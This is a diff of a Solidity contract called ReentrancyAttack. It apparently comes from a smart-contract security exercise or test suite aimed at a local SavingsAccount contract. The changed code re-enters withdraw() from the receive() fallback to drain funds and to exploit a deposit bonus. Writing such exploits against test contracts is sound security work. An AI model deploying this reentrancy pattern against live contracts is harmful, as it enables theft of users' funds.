@@ -6,32 +6,35 @@ import "../src/SavingsAccount.sol";
 contract ReentrancyAttack {
     SavingsAccount public savingsAccount;
     address public owner;
-    uint256 public reentrancyCount;
 
     constructor(SavingsAccount _savingsAccount) {
         savingsAccount = _savingsAccount;
         owner = msg.sender;
     }
 
-    // Fallback function to receive Ether and re-enter the withdraw function
     receive() external payable {
-        // Check if the savings account still has enough balance for re-entrancy
-        uint256 savingsAccountBalance = address(savingsAccount).balance;
-        
-        if (reentrancyCount < 5 && savingsAccountBalance >= 50 ether) {
-            reentrancyCount++;
-            savingsAccount.withdraw(50 ether);
+        uint256 balance = savingsAccount.balances(address(this));
+        uint256 savingsBalance = address(savingsAccount).balance;
+
+        if (balance > 0) {
+            if (savingsBalance > 0) {
+                savingsAccount.deposit{value: 1 ether}();
+                uint256 withdrawAmount = balance > 2 ether ? 2 ether : balance;
+                savingsAccount.withdraw(withdrawAmount);
+            } else {
+                return;
+            }
         }
     }
 
     function attack() external payable {
-        require(msg.value >= 150 ether, "Not enough Ether sent for attack");
+        require(msg.value >= 100 ether, "Not enough Ether sent for attack");
+        
+        // Deposit just enough to be eligible for the bonus
+        savingsAccount.deposit{value: 100 ether}();
 
-        // Deposit sufficient funds to be eligible for the bonus
-        savingsAccount.deposit{value: msg.value}();
-
-        // Initiate withdrawal to trigger reentrancy
-        savingsAccount.withdraw(50 ether);
+        // Start the attack by withdrawing 2 ether
+        savingsAccount.withdraw(2 ether);
     }
 
     function collectFunds() external {
